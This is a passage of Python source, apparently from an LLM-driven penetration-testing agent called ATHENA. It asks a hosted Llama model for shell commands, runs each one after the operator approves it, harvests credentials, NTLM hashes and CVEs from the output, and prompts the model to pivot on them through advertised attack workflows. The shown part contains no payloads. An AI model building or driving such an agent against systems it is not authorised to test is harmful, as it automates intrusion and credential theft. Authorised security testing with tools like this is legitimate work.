                clean = re.sub(r'\033\[[0-9;]*m', '', text)
                self.logfile.write(clean + "\n")
                self.logfile.flush()
            except Exception:
                pass

    def _run_boot_check(self):
        if os.path.exists(BOOT_LOCK):
            return
        print("\n\033[35m   ATHENA:\033[0m Boot check...")
        result = subprocess.run(
            "apt list --upgradable 2>/dev/null",
            shell=True, capture_output=True, text=True
        )
        upgrades = result.stdout.lower()
        threats  = [p for p in BANNED_UPGRADE_PACKAGES if p in upgrades]
        if threats:
            print(f"\033[33m   UI THREAT BLOCKED: {', '.join(threats)}\033[0m")
        else:
            print("\033[32m   System health: OK\033[0m")
        with open(BOOT_LOCK, "w") as f:
            f.write("initialized")
        print("\033[35m   ATHENA:\033[0m Online.\n")

    def set_target(self):
        print("\n\033[35m   ATHENA:\033[0m Define session target.")
        print("\033[90m   Press Enter to skip any field.\033[0m\n")
        ip     = input("   Target IP / CIDR range : ").strip()
        domain = input("   Target domain / URL    : ").strip()
        notes  = input("   Mission notes          : ").strip()
        self.target_info = {
            "ip":     ip     or None,
            "domain": domain or None,
            "notes":  notes  or None,
        }
        if not ip and not domain:
            print("\n\033[33m   No target set.\033[0m")
        else:
            summary = " | ".join(filter(None, [ip, domain]))
            print(f"\n\033[32m   Target locked: {summary}\033[0m")
            self._log(f"[TARGET] {summary} | Notes: {notes}")

    def _is_banned(self, cmd: str) -> bool:
        return any(b in cmd.lower() for b in BANNED_COMMANDS)

    def run_command(self, cmd: str) -> str:
        print(f"\n\033[35m   ATHENA SUGGESTS:\033[0m")
        print(f"\033[97m   {cmd}\033[0m\n")
        self._log(f"\n[CMD PROPOSED]\n{cmd}")

        try:
            choice = input(
                "\033[90m   Execute? [y] yes  [n] skip  [q] quit: \033[0m"
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            return "SESSION_EXIT"

        if choice == "q":
            return "SESSION_EXIT"
        if choice != "y":
            print("\033[90m   Skipped.\033[0m")
            self._log("[SKIPPED]")
            return "COMMAND_REJECTED"

        print(f"\n\033[33m   Executing...\033[0m\n")
        output_lines = []

        try:
            proc = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            for line in proc.stdout:
                print(line, end="")
                output_lines.append(line)
            proc.wait()
        except Exception as e:
            err = f"EXECUTION ERROR: {e}"
            print(f"\033[31m{err}\033[0m")
            return err

        output = "".join(output_lines)

        if any(kw in cmd for kw in [
            "nmap", "whatweb", "nikto", "smbclient", "masscan"
        ]):
            cve_extra = auto_cve_lookup(output)
            if cve_extra:
                print(cve_extra)
                output += "\n" + re.sub(r'\033\[[0-9;]*m', '', cve_extra)

        self.findings = extract_findings(output, self.findings)

        if len(output) > MAX_OUTPUT_CHARS:
            output = (
                output[:MAX_OUTPUT_CHARS]
                + f"\n[TRUNCATED -- {len(output) - MAX_OUTPUT_CHARS} chars omitted]"
            )

        output = output.strip() or "(no output)"
        self._log(f"[OUTPUT]\n{output}")
        return output

    def think(self, prompt: str):
        system_prompt = build_system_prompt(
            self.target_info, self.findings, self.lhost
        )
        windowed = self.history[-MAX_HISTORY_MESSAGES:]
        messages = [{"role": "system", "content": system_prompt}]
        messages.extend(windowed)
        messages.append({"role": "user", "content": prompt})

        try:
            completion = self.client.chat.completions.create(
                model="llama-3.3-70b-versatile",
                messages=messages,
                temperature=0.2,
                max_tokens=1024,
            )
            response = completion.choices[0].message.content
        except Exception as e:
            print(f"\n\033[31m   Groq API error: {e}\033[0m")
            return None, None

        self.history.append({"role": "user",      "content": prompt})
        self.history.append({"role": "assistant",  "content": response})
        self._log(f"[AI]\n{response}")

        thought_match = re.search(
            r'\[THOUGHT\](.*?)\[/?THOUGHT\]',
            response, re.DOTALL | re.IGNORECASE
        )
        thought = (
            thought_match.group(1).strip()
            if thought_match else "[No reasoning block]"
        )
        print(f"\n\033[90m   ATHENA THINKING:\n   {thought}\033[0m")

        cmd_match = re.search(
            r'\[CMD\](.*?)\[/?CMD\]',
            response, re.DOTALL | re.IGNORECASE
        )
        if not cmd_match:
            print(
                "\n\033[33m   No [CMD] block found. "
                "Try rephrasing your objective.\033[0m"
            )
            return thought, None

        return thought, cmd_match.group(1).strip()

    def _agent_loop(self, initial_prompt: str):
        prompt = initial_prompt

        while True:
            thought, cmd = self.think(prompt)
            if cmd is None:
                break

            if self._is_banned(cmd):
                print("\n\033[31m   ATHENA: Banned command blocked.\033[0m")
                self._log("[BLOCKED]")
                prompt = (
                    "That apt upgrade variant is hard-blocked. "
                    "Use which or dpkg -l to check tools. "
                    "Provide safe alternative with [THOUGHT] and [CMD]."
                )
                continue

            if WORKFLOW_DONE in cmd.upper():
                print("\n\033[32m   ATHENA: Workflow complete.\033[0m\n")
                self._log("[WORKFLOW COMPLETE]")
                break

            output = self.run_command(cmd)

            if output == "SESSION_EXIT":
                print("\n\033[35m   ATHENA:\033[0m Session ended by The Priest.")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                sys.exit(0)

            if output == "COMMAND_REJECTED":
                try:
                    alt = input(
                        "\n\033[35m   ATHENA:\033[0m Suggest alternative? [y/n]: "
                    ).strip().lower()
                except (EOFError, KeyboardInterrupt):
                    break
                if alt == "y":
                    prompt = (
                        "The Priest rejected that command. "
                        "Suggest a meaningfully different approach. "
                        "[THOUGHT] and [CMD]."
                    )
                    continue
                else:
                    break

            pivot_block = ""
            pivotable = {
                k: v for k, v in self.findings.items()
                if v and k in (
                    "username", "hash_ntlm", "hash_generic",
                    "credential", "cve", "open_port", "ip_address", "domain"
                )
            }
            if pivotable:
                pivot_block = "\n\nACTIONABLE FINDINGS TO PIVOT ON NOW:\n"
                for k, v in pivotable.items():
                    unique = list(dict.fromkeys(v))[-5:]
                    pivot_block += f"  {k.upper()}: {', '.join(str(x) for x in unique)}\n"

            prompt = (
                f"TERMINAL OUTPUT:\n{output}"
                f"{pivot_block}\n\n"
                "Analyze with elite [THOUGHT]. Reference findings and pivot. "
                "If mission complete put WORKFLOW_COMPLETE in [CMD]. "
                "Otherwise issue next [CMD]."
            )

    def _resolve_target_for_workflow(self) -> str:
        target = (
            self.target_info.get("ip")
            or self.target_info.get("domain")
            or ""
        )
        if not target:
            try:
                target = input(
                    "\033[90m   Enter target IP / domain: \033[0m"
                ).strip()
            except (EOFError, KeyboardInterrupt):
                target = ""
        return target

    def run_workflow(self, key: str):
        wf = WORKFLOWS[key]
        print(
            f"\n\033[35m   ATHENA:\033[0m "
            f"Initiating \033[97m{wf['name']}\033[0m...\n"
        )
        self._log(f"[WORKFLOW] {wf['name']}")
        target = self._resolve_target_for_workflow()
        if not target:
            print("\033[31m   Cannot run workflow without a target.\033[0m")
            return
        prompt = wf["prompt"].format(target=target)
        self._agent_loop(prompt)

    def show_workflow_menu(self):
        print("\n\033[35m   ATHENA:\033[0m Workflows:\n")
        for k, wf in WORKFLOWS.items():
            print(f"   \033[97m[{k:>2}]\033[0m  {wf['name']}")
            print(f"          \033[90m{wf['description']}\033[0m")
        print(f"\n   \033[97m[ 0]\033[0m  Cancel\n")
        try:
            choice = input("\033[90m   Select: \033[0m").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if choice in WORKFLOWS:
            self.run_workflow(choice)
        elif choice != "0":
            print("\033[33m   Invalid selection.\033[0m")

    def show_findings(self):
        has_any = any(v for v in self.findings.values())
        if not has_any:
            print("\n\033[90m   No findings yet.\033[0m\n")
            return
        print("\n\033[35m   ATHENA -- FINDINGS:\033[0m\n")
        for key, vals in self.findings.items():
            if vals:
                unique = list(dict.fromkeys(vals))
                print(f"   \033[97m{key.upper()}:\033[0m")
                for v in unique[-10:]:
                    print(f"      \033[90m- {v}\033[0m")
        print()

    def _generate_report(self):
        ts       = datetime.datetime.now()
        duration = ts - self.session_start
        rpath    = os.path.join(
            LOG_DIR,
            f"report_{self.session_start.strftime('%Y%m%d_%H%M%S')}.txt"
        )
        try:
            with open(rpath, "w") as f:
                f.write("=" * 60 + "\n")
                f.write(f"ATHENA v{VERSION} SESSION REPORT\n")
                f.write("=" * 60 + "\n")
                f.write(f"Started  : {self.session_start.isoformat()}\n")
                f.write(f"Ended    : {ts.isoformat()}\n")
                f.write(f"Duration : {str(duration).split('.')[0]}\n")
                t_str = " | ".join(filter(None, [
                    self.target_info.get("ip",     ""),
                    self.target_info.get("domain", "")
                ]))
                f.write(f"Target   : {t_str or 'Not set'}\n")
                f.write(f"LHOST    : {self.lhost}\n\n")
                f.write("-" * 60 + "\nFINDINGS\n" + "-" * 60 + "\n")
                for key, vals in self.findings.items():
                    if vals:
                        unique = list(dict.fromkeys(vals))
                        f.write(f"\n{key.upper()}:\n")
                        for v in unique:
                            f.write(f"  - {v}\n")
                f.write("\n" + "=" * 60 + "\nEND OF REPORT\n")
            print(f"\n\033[32m   Report: {rpath}\033[0m")
        except Exception as e:
            print(f"\033[33m   Report failed: {e}\033[0m")

    def save_session(self):
        ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(LOG_DIR, f"save_{ts}.txt")
        try:
            with open(path, "w") as f:
                f.write(f"ATHENA SAVE -- {ts}\n{'='*60}\n\n")
                for msg in self.history:
                    f.write(f"[{msg['role'].upper()}]\n{msg['content']}\n\n")
            print(f"\033[32m   Saved: {path}\033[0m")
        except Exception as e:
            print(f"\033[31m   Save failed: {e}\033[0m")

    def show_help(self):
        print(
            "\n\033[35m   ATHENA v5.0 -- COMMANDS\033[0m\n"
            "   \033[97mworkflow\033[0m   23 pre-built attack workflows\n"
            "   \033[97mtarget\033[0m     Set or update session target\n"
            "   \033[97mfindings\033[0m   Show all extracted findings\n"
            "   \033[97msave\033[0m       Save session to file\n"
            "   \033[97mreport\033[0m     Generate session report now\n"
            "   \033[97mclear\033[0m      Clear AI memory (findings preserved)\n"
            "   \033[97mhelp\033[0m       Show this menu\n"
            "   \033[97mexit / q\033[0m   End session and report\n\n"
            "   \033[90mOr type any objective in plain English.\033[0m\n"
            f"   \033[90mLHOST: {self.lhost}\033[0m\n"
        )

    def repl(self):
        print(BANNER)
        self.set_target()
        self.show_help()

        while True:
            try:
                user_input = input("\033[35m[PRIEST]\033[0m > ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n\033[35m   ATHENA:\033[0m Session ended.\n")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                break

            if not user_input:
                continue

            self._log(f"[PRIEST] {user_input}")
            cmd = user_input.lower()

            if cmd in ("exit", "quit", "q"):
                print("\n\033[35m   ATHENA:\033[0m Generating report...\n")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                break
            elif cmd == "help":
                self.show_help()
            elif cmd == "workflow":
                self.show_workflow_menu()
            elif cmd == "target":
                self.set_target()
            elif cmd == "findings":
                self.show_findings()
            elif cmd == "save":
                self.save_session()
            elif cmd == "report":
                self._generate_report()
            elif cmd == "clear":
                self.history.clear()
                print("\033[90m   Memory cleared. Findings preserved.\033[0m")
            else:
                self._agent_loop(user_input)


if __name__ == "__main__":
    session = AthenaSession()
    session.repl()
